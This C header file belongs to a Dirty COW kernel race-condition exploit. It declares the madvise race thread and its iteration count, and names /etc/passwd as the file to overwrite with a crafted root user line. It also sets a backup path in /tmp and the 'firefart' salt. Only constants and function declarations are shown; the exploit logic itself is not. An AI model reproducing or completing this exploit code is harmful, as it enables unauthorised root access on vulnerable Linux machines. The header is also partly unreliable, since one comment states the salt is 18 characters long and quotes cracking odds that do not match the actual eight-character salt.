#ifndef DIRTY_COW_ROOT_EXPLOIT_H
#define DIRTY_COW_ROOT_EXPLOIT_H

// Defining main app constants
/// Codes
const int FILE_IS_PRESENT_CODE = 0;
const int CREATE_BACKUP_FILE_FAILURE_CODE = -1;
const int CREATE_BACKUP_FILE_SUCCESS_CODE = 0;
const int MEMORY_ALLOCATE_FAILURE_CODE = -1;

/// Sizes
const int STRING_ENDING_CHARACTER_SIZE = 1;

/// Race conditions
// Madvise thread race iterations amount
// It will equal to 2 * 10 ** 8
const int MADVISE_THREAD_ITERATION_COUNT = 200000000;
const int MADVISE_THREAD_SIZE = 100;

/// Files
// Source file name
const char *SOURCE_FILE_NAME_PATH = "/etc/passwd";
// Backup file name
const char *BACKUP_FILE_NAME_PATH = "/tmp/passwd.bak";

/// Strings
// Complexity of hacking this password is 95 ** #{PASSWORD_SALT.length} which
// equals to 95 ** 18 = 3.972143184582185e+35 possible passwords
const char *PASSWORD_SALT = "firefart";
const char *PASSWORD_LINE_FORMAT = "%s:%s:%d:%d:%s:%s:%s\n";

/// File read/write/etc arguments to the `fopen` function
const char *FILE_READ = "r";
const char *FILE_WRITE = "w";

/**
 * @define {Struct} UserInformation - Structure to hold user information
 * @attr {String} username - Users username
 * @attr {String} hash - Users hash?
 * @attr {Integer} user_id - Users ID
 * @attr {Integer} group_id - Users group ID
 * @attr {String} info - Users info?
 * @attr {String} home_dir - Users home directory
 * @attr {String} shell - Users shebang(Current version of the bash for the
 * current user)
 */
struct UserInformation {
  char *username;
  char *hash;
  int user_id;
  int group_id;
  char *info;
  char *home_dir;
  char *shell;
};

/**
 * @description Generate password hash based on the text passed as argument
 *
 * @param {String} password - Text based on which generate password hash
 *
 * @return {String} Generated password hash
 */
char *generatePasswordHash(char *password);

/**
 * @description Generate password line based on the user information
 *
 * @param {Struct|UserInformation} user - User information
 *
 * @return {String} Generated password line
 */
char *generatePasswordLine(struct UserInformation user);

/**
 * @description Memory advise thread
 *
 * @param {void} arg -
 *
 * @return {void}
 */
void *madviseThread(void *arg);

/**
 * @description Copy content of the one file into other.
 *
 * @param {String} sourceFileNamePath - Source file path from which to read.
 * @param {String} targetFileNamePath - Source file path to which write.
 *
 * @return {Integer} - Result of copying file.
 */
 int createBackupFile(const char *sourceFileNamePath, const char *targetFileNamePath);

#endif // DIRTY_COW_ROOT_EXPLOIT_H
